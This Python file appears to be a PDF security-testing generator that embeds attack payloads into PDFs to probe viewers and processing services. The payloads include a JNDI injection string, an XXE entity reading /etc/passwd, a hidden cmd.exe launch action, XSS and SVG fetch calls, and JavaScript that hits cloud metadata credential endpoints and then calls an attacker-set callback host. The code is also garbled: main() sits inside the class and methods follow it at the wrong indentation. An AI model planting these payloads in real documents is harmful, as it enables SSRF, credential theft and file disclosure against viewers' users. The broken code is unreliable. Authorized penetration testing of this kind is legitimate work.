"""
PDF Security Testing Tool
------------------------

This tool generates PDF files containing various security test payloads for evaluating
PDF processing services and viewers. It is intended ONLY for security testing in 
controlled, isolated environments with explicit authorization.

Enhanced version with improved security, validation, and error handling.
"""

import os
import io
import logging
import json
from datetime import datetime
import time
from urllib.parse import urlparse
import warnings
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import argparse
import warnings
from pathlib import Path
import hashlib
import uuid
import re
from contextlib import contextmanager

try:
    from PyPDF2 import PdfWriter, PdfReader
    from reportlab.pdfgen import canvas
    from reportlab.lib.pagesizes import letter
except ImportError as e:
    print(f"Required dependency not found: {e}")
    print("Please install required packages: pip install PyPDF2 reportlab")
    exit(1)

class SecurityLevel(Enum):
    """Security levels for test payloads"""
    LOW = "Low"
    MEDIUM = "Medium"
    HIGH = "High"
    CRITICAL = "Critical"

class PayloadCategory(Enum):
    """Categories of security test payloads"""
    METADATA = "metadata"
    JAVASCRIPT = "javascript"
    XSS = "xss"
    SSRF = "ssrf"
    FILE_INCLUSION = "file_inclusion"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    HTML_INJECTION = "html_injection"
    TEMPLATE_INJECTION = "template_injection"
    SVG_INJECTION = "svg_injection"
    EMBEDDED_FILES = "embedded_files"
    DIGITAL_SIGNATURES = "digital_signatures"
    PDF_STRUCTURE = "pdf_structure"
    FONT_ATTACKS = "font_attacks"
    XFA_FORMS = "xfa_forms"
    PDF_ACTIONS = "pdf_actions"
    ANNOTATIONS = "annotations"
    LAYERS = "layers"
    ENCRYPTION = "encryption"
    UNICODE = "unicode"

@dataclass
class TestPayload:
    """Represents a security test payload with metadata"""
    name: str
    content: str
    category: PayloadCategory
    description: str
    viewer_requirements: List[str]
    expected_outcome: str
    severity: SecurityLevel
    mitigation: str
    tags: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    checksum: str = field(init=False)

    def __post_init__(self):
        """Calculate payload checksum after initialization"""
        self.checksum = hashlib.sha256(
            f"{self.name}{self.content}{self.category.value}".encode()
        ).hexdigest()

    def validate(self) -> bool:
        """Validate payload attributes"""
        if not self.name or not isinstance(self.name, str):
            return False
        if not self.content:
            return False
        if not isinstance(self.severity, SecurityLevel):
            return False
        return True

class PDFSecurityException(Exception):
    """Base exception for PDF security testing"""
    pass

class ConfigurationError(PDFSecurityException):
    """Configuration validation errors"""
    pass

class PayloadExecutionError(PDFSecurityException):
    """Payload execution failures"""
    pass

class ValidationError(PDFSecurityException):
    """Data validation errors"""
    pass

@contextmanager
def pdf_operation_context(operation_name: str, logger: logging.Logger):
    """Enhanced context manager for PDF operations"""
    start_time = time.time()
    try:
        logger.info(f"Starting operation: {operation_name}")
        yield
        duration = time.time() - start_time
        logger.info(f"Completed {operation_name} in {duration:.2f}s")
    except Exception as e:
        logger.error(f"Critical failure during {operation_name}: {str(e)}")
        logger.debug(f"Stack trace:", exc_info=True)
        raise PDFSecurityException(f"{operation_name} failed: {str(e)}") from e

# Check PyPDF2 version compatibility
from PyPDF2 import __version__ as pdf_version
if pdf_version < "3.0.0":
    warnings.warn("PyPDF2 version 3.0.0 or newer is recommended")

class PDFSecurityTester:
    """Main class for PDF security testing"""

    def __init__(self, callback_url: str, config: Optional[Dict] = None):
        """Initialize the PDF Security Tester"""
        if not self._validate_callback_url(callback_url):
            raise ConfigurationError("Invalid callback URL format")

        self.callback_url = callback_url
        self.test_id = str(uuid.uuid4())
        self.config = config or {}
        
        # Initialize tracking
        self.inserted_payloads: List[TestPayload] = []
        self.execution_log: List[Dict] = []
        self.custom_payloads: List[TestPayload] = []
        self.failed_payloads: List[Tuple[TestPayload, str]] = []
        
        # Set up logging
        self.logger = self._setup_logging()
        
        # Validate configuration
        self._validate_config()
        
        # Load custom payloads
        self._load_custom_payloads()

    @staticmethod
    def _validate_callback_url(url: str) -> bool:
        """Validate callback URL format"""
        try:
            result = urlparse(url)
            if not all([result.scheme, result.netloc]):
                return False
            if result.scheme not in ['http', 'https']:
                return False
            # Additional security checks
            if result.username or result.password:
                return False  # Don't allow credentials in URL
            return True
        except Exception:
            return False
        return bool(url_pattern.match(url))

    def _setup_logging(self) -> logging.Logger:
        """Configure logging with both file and console handlers"""
        logger = logging.getLogger('PDFSecurityTester')
        logger.setLevel(logging.INFO)
        
        # Add console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(console_handler)
        
        # Add file handler
        log_file = f"pdf_security_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(file_handler)
        
        return logger

    def _validate_config(self) -> None:
        """Validate the configuration"""
        if not self.config:
            return

        try:
            if 'enabled_categories' in self.config:
                invalid_categories = set(self.config['enabled_categories']) - {c.value for c in PayloadCategory}
                if invalid_categories:
                    raise ConfigurationError(f"Invalid categories in config: {invalid_categories}")
            
            if 'min_severity' in self.config:
                try:
                    SecurityLevel(self.config['min_severity'])
                except ValueError:
                    raise ConfigurationError(f"Invalid severity level: {self.config['min_severity']}")
            
            if 'callback_timeout' in self.config:
                timeout = self.config['callback_timeout']
                if not isinstance(timeout, (int, float)) or timeout <= 0:
                    raise ConfigurationError("callback_timeout must be a positive number")
                    
        except Exception as e:
            self.logger.error(f"Configuration validation error: {str(e)}")
            raise ConfigurationError(f"Configuration validation failed: {str(e)}")

    def _sanitize_payload_content(self, content: str | bytes) -> str | bytes:
        """Basic sanitization of payload content"""
        if isinstance(content, str):
            # Remove null bytes and other dangerous characters
            sanitized = content.replace("\0", "")
            # Basic XSS protection for HTML content
            if "<" in content:
                sanitized = sanitized.replace("<script", "&lt;script")
            return sanitized
        elif isinstance(content, bytes):
            # Remove null bytes from binary content
            return content.replace(b"\0", b"")
        return content

    def _record_payload_execution(self, payload: TestPayload, success: bool, error: Optional[str] = None) -> None:
        """Record payload execution status and update tracking"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'payload': payload.name,
            'category': payload.category.value,
            'success': success,
            'error': error,
            'checksum': payload.checksum,
            'severity': payload.severity.value
        }
        self.execution_log.append(entry)
        
        if success:
            self.inserted_payloads.append(payload)
            self.logger.info(f"Successfully executed payload: {payload.name}")
        else:
            self.failed_payloads.append((payload, error or "Unknown error"))
            self.logger.warning(f"Failed to execute payload {payload.name}: {error}")

    def _load_custom_payloads(self) -> None:
        """Load and validate custom payloads from configuration"""
        if 'custom_payloads' not in self.config:
            return

        required_fields = {'name', 'content', 'category', 'severity'}
        
        for payload_data in self.config['custom_payloads']:
            try:
                # Validate required fields
                missing_fields = required_fields - set(payload_data.keys())
                if missing_fields:
                    raise ValidationError(f"Missing required fields: {missing_fields}")
                
                # Validate category
                try:
                    category = PayloadCategory(payload_data['category'])
                except ValueError:
                    raise ValidationError(f"Invalid category: {payload_data['category']}")
                
                # Validate severity
                try:
                    severity = SecurityLevel(payload_data['severity'])
                except ValueError:
                    raise ValidationError(f"Invalid severity: {payload_data['severity']}")
                
                # Create payload
                payload = TestPayload(
                    name=payload_data['name'],
                    content=payload_data['content'],
                    category=category,
                    description=payload_data.get('description', 'Custom payload'),
                    viewer_requirements=payload_data.get('viewer_requirements', ['Unknown']),
                    expected_outcome=payload_data.get('expected_outcome', 'Unknown'),
                    severity=severity,
                    mitigation=payload_data.get('mitigation', 'Unknown'),
                    tags=payload_data.get('tags', []),
                    references=payload_data.get('references', [])
                )
                
                # Validate payload
                if not payload.validate():
                    raise ValidationError(f"Invalid payload data for {payload.name}")
                
                self.custom_payloads.append(payload)
                
            except Exception as e:
                self.logger.warning(f"Skipping invalid custom payload: {str(e)}")

    def _should_include_payload(self, payload: TestPayload) -> bool:
        """Determine if a payload should be included based on configuration"""
        if not self.config:
            return True
            
        # Check enabled categories
        if 'enabled_categories' in self.config:
            if payload.category.value not in self.config['enabled_categories']:
                return False
        
        # Check excluded payloads
        if 'excluded_payloads' in self.config:
            if payload.name in self.config['excluded_payloads']:
                return False
        
        # Check minimum severity
        if 'min_severity' in self.config:
            config_severity = SecurityLevel(self.config['min_severity'])
            if payload.severity.value < config_severity.value:
                return False
        
        return True

    def _create_in_memory_pdf(self) -> Tuple[canvas.Canvas, io.BytesIO]:
        """Create a PDF in memory"""
        buffer = io.BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        return c, buffer

    def _add_pdf_object(self, writer: PdfWriter, content: Dict[str, Any]) -> None:
        """Add a PDF object to the document"""
        from PyPDF2.generic import (
            DictionaryObject, 
            NameObject,
            TextStringObject,
            StreamObject,
            ArrayObject,
            NumberObject,
            BooleanObject
        )
        
        try:
            obj = DictionaryObject()
            
            for key, value in content.items():
                if key == '_stream_data':
                    continue
                    
                name_key = NameObject(f"/{key}" if not key.startswith('/') else key)
                
                if isinstance(value, dict):
                    nested_obj = self._create_nested_dict(value)
                    obj[name_key] = nested_obj
                elif isinstance(value, (list, tuple)):
                    obj[name_key] = self._create_array(value)
                else:
                    obj[name_key] = self._convert_value(value)
            
            # Handle stream data
            if '_stream_data' in content:
                stream = StreamObject()
                stream._data = (content['_stream_data'] if isinstance(content['_stream_data'], bytes)
                              else content['_stream_data'].encode())
                stream.update({
                    NameObject('/Length'): NumberObject(len(stream._data))
                })
                obj.update(stream)
            
            writer._add_object(obj)
            
        except Exception as e:
            raise PayloadExecutionError(f"Failed to add PDF object: {str(e)}")

    def _create_nested_dict(self, data: Dict) -> DictionaryObject:
        """Create a nested PDF dictionary object"""
        nested = DictionaryObject()
        for k, v in data.items():
            name_key = NameObject(f"/{k}" if not k.startswith('/') else k)
            if isinstance(v, dict):
                nested[name_key] = self._create_nested_dict(v)
            elif isinstance(v, (list, tuple)):
                nested[name_key] = self._create_array(v)
            else:
                nested[name_key] = self._convert_value(v)
        return nested

    def _create_array(self, data: List) -> ArrayObject:
        """Create a PDF array object"""
        return ArrayObject([
            self._create_nested_dict(x) if isinstance(x, dict)
            else self._create_array(x) if isinstance(x, (list, tuple))
            else self._convert_value(x)
            for x in data
        ])

    def _convert_value(self, value: Any) -> Any:
        """Convert Python values to PDF object types"""
        from PyPDF2.generic import (
            NameObject,
            NumberObject,
            TextStringObject,
            BooleanObject
        )
        
        if isinstance(value, str):
            if value.startswith('/'):
                return NameObject(value)
            return TextStringObject(value)
        elif isinstance(value, (int, float)):
            return NumberObject(value)
        elif isinstance(value, bool):
            return BooleanObject(value)
        else:
            return TextStringObject(str(value))

    def create_security_test_pdf(self, output_path: str) -> None:
        """Create a PDF with security test payloads"""
        writer = PdfWriter()
        successful_payloads = 0
        failed_payloads = 0
        
        with pdf_operation_context("PDF creation", self.logger):
            test_methods = [
                self.add_metadata_payloads,
                self.add_javascript_payloads,
                self.add_xss_payloads,
                self.add_structure_payloads,
                self.add_font_payloads,
                self.add_form_payloads,
                self.add_annotation_payloads,
                self.add_advanced_javascript_payloads,
                self.add_embedded_file_payloads,
                self.add_resource_exhaustion_tests
            ]
            
            for method in test_methods:
                try:
                    method(writer)
                    successful_payloads += 1
                except Exception as e:
                    self.logger.error(f"Error in {method.__name__}: {str(e)}")
                    failed_payloads += 1
            
            # Validate and save PDF
            self._save_and_validate_pdf(writer, output_path)
            
            # Generate report
            self._generate_report(output_path, {
                'successful_payloads': successful_payloads,
                'failed_payloads': failed_payloads,
                'total_payloads': len(self.execution_log)
            })

    def _save_and_validate_pdf(self, writer: PdfWriter, output_path: str) -> None:
        """Save and validate the generated PDF"""
        # First write to a temporary buffer for validation
        temp_buffer = io.BytesIO()
        
        with pdf_operation_context("PDF validation", self.logger):
            writer.write(temp_buffer)
            temp_buffer.seek(0)
            
            # Try to read it back to validate
            try:
                PdfReader(temp_buffer)
            except Exception as e:
                raise ValidationError(f"Generated PDF failed validation: {str(e)}")
            
            # If validation passes, write to actual file
            with open(output_path, 'wb') as output_file:
                writer.write(output_file)

    def _generate_report(self, pdf_path: str, stats: Dict[str, int]) -> None:
        """Generate a detailed test report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'pdf_path': pdf_path,
            'test_id': self.test_id,
            'callback_url': self.callback_url,
            'statistics': stats,
            'configuration': self.config,
            'execution_log': self.execution_log,
            'payloads': [
                {
                    'name': p.name,
                    'category': p.category.value,
                    'description': p.description,
                    'viewer_requirements': p.viewer_requirements,
                    'expected_outcome': p.expected_outcome,
                    'severity': p.severity.value,
                    'mitigation': p.mitigation,
                    'tags': p.tags,
                    'references': p.references,
                    'checksum': p.checksum
                }
                for p in self.inserted_payloads
            ]
        }
        
        report_path = f"{pdf_path}.report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Test report generated: {report_path}")
        
        # Print summary
        print("\nTest Execution Summary:")
        print(f"Total Payloads: {stats['total_payloads']}")
        print(f"Successful: {stats['successful_payloads']}")
        print(f"Failed: {stats['failed_payloads']}")
        print(f"\nDetailed report saved to: {report_path}")

    def add_metadata_payloads(self, writer: PdfWriter) -> None:
        """Add metadata-based test payloads"""
        metadata_payloads = [
            TestPayload(
                name="JNDI Injection",
                content=f'${{jndi:ldap://{self.callback_url}/metadata/{self.test_id}}}',
                category=PayloadCategory.METADATA,
                description="Tests JNDI injection via PDF metadata",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May trigger JNDI lookup in vulnerable environments",
                severity=SecurityLevel.HIGH,
                mitigation="Sanitize metadata fields, disable JNDI lookups"
            ),
            TestPayload(
                name="XXE in Metadata",
                content=f'''<?xml version="1.0"?>
                    <!DOCTYPE data [
                        <!ENTITY file SYSTEM "file:///etc/passwd">
                    ]>
                    <data>&file;</data>''',
                category=PayloadCategory.XXE,
                description="Tests XXE injection via PDF metadata",
                viewer_requirements=["PDF processors with XML parsing"],
                expected_outcome="May read local files if XXE is not disabled",
                severity=SecurityLevel.HIGH,
                mitigation="Disable XXE in XML parsers, sanitize metadata"
            )
        ]
        
        metadata = {}
        for payload in metadata_payloads:
            if self._should_include_payload(payload):
                try:
                    metadata[f'/Test_{payload.name}'] = payload.content
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add metadata payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_annotation_payloads(self, writer: PdfWriter) -> None:
        """Add annotation-based test payloads"""
        annotation_payloads = [
            TestPayload(
                name="JavaScript Annotation",
                content={
                    'Type': '/Annot',
                    'Subtype': '/Link',
                    'Rect': [0, 0, 100, 100],
                    'A': {
                        'S': '/JavaScript',
                        'JS': f'app.launchURL("{self.callback_url}/annot/{self.test_id}");'
                    }
                },
                category=PayloadCategory.ANNOTATIONS,
                description="Tests JavaScript in annotations",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript",
                severity=SecurityLevel.MEDIUM,
                mitigation="Disable annotation scripts"
            ),
            TestPayload(
                name="Hidden Action Annotation",
                content={
                    'Type': '/Annot',
                    'Subtype': '/Link',
                    'Rect': [0, 0, 0, 0],  # Hidden rectangle
                    'F': 2,  # Hidden flag
                    'A': {
                        'Type': '/Action',
                        'S': '/Launch',
                        'F': '(cmd.exe)'  # Windows command prompt
                    }
                },
                category=PayloadCategory.ANNOTATIONS,
                description="Tests hidden annotations with dangerous actions",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="Should block launch actions",
                severity=SecurityLevel.CRITICAL,
                mitigation="Disable launch actions, validate annotations"
            )
        ]
        
        for payload in annotation_payloads:
            if self._should_include_payload(payload):
                try:
                    self._add_pdf_object(writer, payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_advanced_javascript_payloads(self, writer: PdfWriter) -> None:
        """Add advanced JavaScript execution tests"""
        js_payloads = [
            TestPayload(
                name="Hidden Layer JavaScript",
                content=f"""
                    var layer = this.addLayer("HiddenLayer");
                    layer.enabled = false;
                    layer.onClick = function() {{
                        app.launchURL("{self.callback_url}/layer/{self.test_id}");
                    }};
                """,
                category=PayloadCategory.JAVASCRIPT,
                description="Tests JavaScript execution in hidden layers",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript from hidden layer",
                severity=SecurityLevel.HIGH,
                mitigation="Disable JavaScript in layers"
            ),
            TestPayload(
                name="Resource Exhaustion",
                content="""
                    var arr = [];
                    while(true) {
                        arr.push(new Array(1000000).join('A'));
                    }
                """,
                category=PayloadCategory.JAVASCRIPT,
                description="Tests memory exhaustion protection",
                viewer_requirements=["PDF processors with JavaScript"],
                expected_outcome="Should be prevented by memory limits",
                severity=SecurityLevel.HIGH,
                mitigation="Implement JavaScript resource limits"
            )
        ]
        
        for payload in js_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_js(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add advanced JS payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_embedded_file_payloads(self, writer: PdfWriter) -> None:
        """Add embedded file-based test payloads"""
        embedded_payloads = [
            TestPayload(
                name="Executable Attachment",
                content=b"MZ" + b"\x90" * 100,  # Fake PE header
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests handling of executable attachments",
                viewer_requirements=["PDF processors with attachment handling"],
                expected_outcome="Should be blocked",
                severity=SecurityLevel.HIGH,
                mitigation="Block executable attachments"
            ),
            TestPayload(
                name="Nested PDF",
                content=b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n1 0 obj\n<<>>\nendobj\n%%EOF",
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests handling of nested PDFs",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should be scanned",
                severity=SecurityLevel.MEDIUM,
                mitigation="Scan nested PDFs"
            )
        ]
        
        for payload in embedded_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addAttachment(f"test_{payload.name}", payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add embedded payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_resource_exhaustion_tests(self, writer: PdfWriter) -> None:
        """Add tests for resource exhaustion vulnerabilities"""
        try:
            # Create a PDF with extremely large dimensions
            writer.add_blank_page(width=100000, height=100000)
            
            # Add a large number of small objects
            for i in range(1000):
                writer._add_object(f"% Comment {i}\n" * 1000)
            
            # Add deeply nested dictionaries
            nested_dict = {"Type": "/Test"}
            current = nested_dict
            for i in range(100):
                current["Next"] = {"Type": f"/Level{i}"}
                current = current["Next"]
            
            self._add_pdf_object(writer, nested_dict)
            
            self.logger.info("Added resource exhaustion tests")
        except Exception as e:
            self.logger.error(f"Failed to add resource exhaustion tests: {str(e)}")

    def _validate_pdf(self, pdf_data: bytes) -> bool:
        """
        Validate PDF structure and content
        Returns True if PDF is valid, False otherwise
        """
        try:
            # Basic PDF header check
            if not pdf_data.startswith(b'%PDF-'):
                return False
                
            # Check for proper EOF marker
            if b'%%EOF' not in pdf_data[-10:]:
                return False
                
            # Attempt to parse with PyPDF2
            with io.BytesIO(pdf_data) as pdf_buffer:
                reader = PdfReader(pdf_buffer)
                # Validate basic structure
                if not reader.pages or len(reader.pages) == 0:
                    return False
                    
            return True
        except Exception as e:
            self.logger.error(f"PDF validation failed: {str(e)}")
            return False

    def _safe_write_pdf(self, writer: PdfWriter, output_path: str) -> None:
        """Safely write PDF to file with validation"""
        # First write to memory
        temp_buffer = io.BytesIO()
        writer.write(temp_buffer)
        pdf_data = temp_buffer.getvalue()
        
        # Validate the PDF
        if not self._validate_pdf(pdf_data):
            raise ValidationError("Generated PDF failed validation")
        
        # Write to file if validation passes
        with open(output_path, 'wb') as output_file:
            output_file.write(pdf_data)

def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description='PDF Security Test Generator - FOR AUTHORIZED TESTING ONLY',
        epilog='WARNING: Use only in controlled environments with proper authorization.'
    )
    parser.add_argument('--callback-host', required=True, help='Callback host for SSRF tests')
    parser.add_argument('--callback-port', required=True, help='Callback port')
    parser.add_argument('--output', default='security_test.pdf', help='Output PDF path')
    parser.add_argument('--config', help='Path to configuration JSON file')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set up logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    logger = logging.getLogger('PDFSecurityTester')
    
    # Display security warning
    logger.warning("""
    ⚠️  WARNING: This tool generates PDFs containing security test payloads.
    Only use in authorized, controlled environments for security testing.
    Never use against production systems without explicit permission.
    """)
    
    callback_url = f"http://{args.callback_host}:{args.callback_port}"
    
    # Load configuration if provided
    config = None
    if args.config:
        try:
            with open(args.config) as f:
                config = json.load(f)
        except Exception as e:
            logger.error(f"Error loading configuration file: {str(e)}")
            return
    
    try:
        tester = PDFSecurityTester(callback_url, config)
        tester.create_security_test_pdf(args.output)
        
        print("\nPDF Security Test Suite - Complete")
        print(f"\nGenerated files:")
        print(f"1. Test PDF: {args.output}")
        print(f"2. Test Report: {args.output}.report.json")
        
        print("\nNext Steps:")
        print("1. Review the test report for payload details")
        print("2. Upload the PDF to your testing environment")
        print("3. Monitor the callback URL for active payloads")
        print("4. Test with different PDF viewers:")
        print("   - Adobe Acrobat DC (JavaScript execution)")
        print("   - PDF.js (Content rendering)")
        print("   - Chrome PDF Viewer (Basic rendering)")
        print("5. Review processing logs for errors")
        
    except Exception as e:
        logger.error(f"Error running security tests: {str(e)}")
        raise

if __name__ == "__main__":
    main()
        
        writer.add_metadata(metadata)

    def add_javascript_payloads(self, writer: PdfWriter) -> None:
        """Add JavaScript-based test payloads"""
        js_payloads = [
            TestPayload(
                name="Cloud Metadata Access",
                content=self._generate_cloud_metadata_js(),
                category=PayloadCategory.JAVASCRIPT,
                description="Tests access to cloud provider metadata",
                viewer_requirements=["Adobe Acrobat with JavaScript"],
                expected_outcome="May trigger callbacks to metadata endpoints",
                severity=SecurityLevel.HIGH,
                mitigation="Disable JavaScript execution, implement SSRF controls"
            ),
            TestPayload(
                name="File System Access",
                content="""
                try {
                    this.exportDataObject({
                        cName: "test.txt",
                        nLaunch: 2
                    });
                } catch(e) {
                    console.log(e);
                }
                """,
                category=PayloadCategory.JAVASCRIPT,
                description="Tests PDF JavaScript file system access",
                viewer_requirements=["Adobe Acrobat with JavaScript"],
                expected_outcome="May access local file system",
                severity=SecurityLevel.HIGH,
                mitigation="Disable JavaScript execution"
            )
        ]
        
        for payload in js_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_js(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add JavaScript payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def _generate_cloud_metadata_js(self) -> str:
        """Generate JavaScript for testing cloud metadata access"""
        return f"""
        try {{
            var endpoints = {{
                'aws_metadata': 'http://169.254.169.254/latest/meta-data/',
                'aws_userdata': 'http://169.254.169.254/latest/user-data/',
                'aws_credentials': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'azure_metadata': 'http://169.254.169.254/metadata/instance',
                'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/'
            }};
            
            for (var key in endpoints) {{
                try {{
                    app.launchURL(endpoints[key]);
                    app.launchURL('{self.callback_url}/js/' + key + '/{self.test_id}');
                }} catch (e) {{
                    console.log('Error testing endpoint ' + key + ': ' + e.message);
                }}
            }}
        }} catch (e) {{
            console.log('Main JavaScript error: ' + e.message);
        }}
        """

    def add_xss_payloads(self, writer: PdfWriter) -> None:
        """Add XSS test payloads"""
        c, buffer = self._create_in_memory_pdf()
        
        xss_payloads = [
            TestPayload(
                name="Basic XSS",
                content='<script>alert(document.domain)</script>',
                category=PayloadCategory.XSS,
                description="Basic XSS test",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May execute JavaScript in vulnerable viewers",
                severity=SecurityLevel.HIGH,
                mitigation="Sanitize rendered content, disable JavaScript"
            ),
            TestPayload(
                name="SVG XSS",
                content=f'''<svg>
                    <script>
                        fetch("{self.callback_url}/xss/svg/{self.test_id}")
                    </script>
                </svg>''',
                category=PayloadCategory.XSS,
                description="SVG-based XSS test",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May execute JavaScript via SVG",
                severity=SecurityLevel.HIGH,
                mitigation="Sanitize SVG content, disable JavaScript"
            )
        ]
        
        y_pos = 750
        for payload in xss_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 30
                except Exception as e:
                    self.logger.error(f"Failed to add XSS payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        buffer.seek(0)
        reader = PdfReader(buffer)
        writer.add_page(reader.pages[0])

    def add_structure_payloads(self, writer: PdfWriter) -> None:
        """Add PDF structure-based test payloads"""
        structure_payloads = [
            TestPayload(
                name="Malformed XRef",
                content={
                    'Type': '/Object',
                    '_stream_data': b'A' * 1000,
                    'Length': 1000
                },
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of malformed PDF structure",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should handle gracefully",
                severity=SecurityLevel.MEDIUM,
                mitigation="Validate PDF structure"
            ),
            TestPayload(
                name="Circular References",
                content={
                    'Type': '/Pages',
                    'Kids': [],  # Will be updated with circular reference
                    'Count': 1
                },
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of circular object references",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect circular references",
                severity=SecurityLevel.HIGH,
                mitigation="Check for circular references"
            )
        ]
        
        for payload in structure_payloads:
            if self._should_include_payload(payload):
                try:
                    self._add_pdf_object(writer, payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_font_payloads(self, writer: PdfWriter) -> None:
        """Add font-based test payloads"""
        font_payloads = [
            TestPayload(
                name="Malformed Font",
                content={
                    'Type': '/Font',
                    'Subtype': '/Type1',
                    'BaseFont': '/' + ('A' * 1000),  # Overly long font name
                    'Encoding': {
                        'Type': '/Encoding',
                        'Differences': [1] + ['/' + ('x' * 100)] * 100  # Large differences array
                    }
                },
                category=PayloadCategory.FONT_ATTACKS,
                description="Tests handling of malformed fonts",
                viewer_requirements=["PDF processors with font support"],
                expected_outcome="Should handle malformed fonts",
                severity=SecurityLevel.HIGH,
                mitigation="Validate font objects"
            )
        ]
        
        for payload in font_payloads:
            if self._should_include_payload(payload):
                try:
                    self._add_pdf_object(writer, payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add font payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_form_payloads(self, writer: PdfWriter) -> None:
        """Add XFA form-based test payloads"""
        xfa_template = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
            <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
                <script contentType="application/x-javascript">
                    app.alert('XFA Execution');
                    app.launchURL("{self.callback_url}/xfa/{self.test_id}");
                </script>
            </template>
        </xdp:xdp>
        """
        
        form_payloads = [
            TestPayload(
                name="XFA Form",
                content=xfa_template,
                category=PayloadCategory.XFA_FORMS,
                description="Tests XFA form processing",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript via XFA",
                severity=SecurityLevel.HIGH,
                mitigation="Disable XFA processing"
            )
        ]
        
        for payload in form_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addObject({
                        '/XFA': payload.content
                    })
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add form payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
